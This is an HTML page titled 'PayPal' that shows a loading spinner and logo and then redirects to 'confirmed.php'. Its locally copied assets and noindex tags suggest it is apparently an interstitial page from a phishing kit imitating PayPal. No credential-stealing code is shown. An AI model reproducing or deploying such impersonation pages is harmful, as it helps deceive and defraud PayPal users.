<html class="popup js no-flexbox flexbox-legacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths jsEnabled js no-flexbox flexbox-legacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers applicationcache svg inlinesvg smil svgclippaths jsEnabled" lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta charset="utf-8">
	<title>PayPal</title>
                <link rel="shortcut icon" href="https://www.paypalobjects.com/en_US/i/icon/pp_favicon_x.ico">
		<link rel="apple-touch-icon" href="https://www.paypalobjects.com/en_US/i/pui/apple-touch-icon.png">	
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	
	<meta name="viewport" content="initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0">
<meta name="robots" content="noindex">
<meta name="robots" content="noarchive">
<meta http-equiv="refresh" content="3;URL=confirmed.php">

	


	
	
	

	
	
		<!--[if IE 8]>
			
			<![endif]-->
		<!--[if IE 7]>
			
			<![endif]-->
		<!--[if IE 6]>
			
			<![endif]-->

	<link href="./css/80d5fee0234079c2ed5c95177ec902.css" rel="stylesheet" type="text/css">
		<!--[if lt IE 9]>
			<link href="https://www.paypalobjects.com/eboxapps/css/54/b477e9735f72d6250f8091ae415b7b.css"  rel="stylesheet" type="text/css" />
			<![endif]-->

	
		<!--[if IE 8]>
			
			<![endif]-->
		<!--[if IE 7]>
			
			<![endif]-->
		<!--[if IE 6]>
			
			<![endif]-->

	
		<!--[if IE 9]>
			<link href="https://www.paypalobjects.com/eboxapps/css/c0/cc0c655765ebab1e61ce2b9f59e4cc.css"  rel="stylesheet" type="text/css" />
			<![endif]-->	
		<!--[if IE 8]>
			<link href="https://www.paypalobjects.com/eboxapps/css/9a/74c143fbda7ab23f01287ac0e9ea0.css"  rel="stylesheet" type="text/css" />
			<![endif]-->
		<!--[if IE 7]>
			<link href="https://www.paypalobjects.com/eboxapps/css/6e/d8aa5661a66df2a981d3826fd5be0b.css"  rel="stylesheet" type="text/css" />
			<![endif]-->
		<!--[if IE 6]>
			
			<![endif]-->

	
	
	
	
	

	
	
	

	
	
	

	

	
	<script src="./js/aa3fed8d73628c9b74c8c2aa3b8139.js" type="text/javascript"></script>
	<script src="./js/ec36ecaa4318c412ff1d1388e2ad5c.js" type="text/javascript"></script>
<style type="text/css"></style></head>



	
		<body class="" id="PPA">
	
	





		<div class="wrap-outer">
			<div class="wrap-inner">
		        <fieldset>
					<div class="loadingImage" id="loadingImg" style="margin: auto; text-align:center;">
						<img id="ldg_md_lt" title="PayPal" class="loadingImage" src="./img/icon_animated_prog_42wx42h.gif" alt="Loading" style="
    margin-top: 160px;
">
					</div>
					<div style="margin: auto; text-align:center;">
						
									        
								
							
							
						
						




	
	
 		<img src="./img/paypal-logo.png" alt="PayPal logo" style="height:29px; width:114px; margin-top:15px;">
		


					</div>
				
				</fieldset>
				<div style="margin: auto; text-align: center; display: none;" class="submit continueButton">
					<a id="continueButtonLink">Continue</a> 
 				</div>
 				
			</div>
				
		</div>
        



<script src="./is/9d2a2c5823e6a36651241883b60a5f.js" type="text/javascript"></script>





















<script type="text/javascript" src="./js/pp_jscode_080706.js"></script>
</body></html>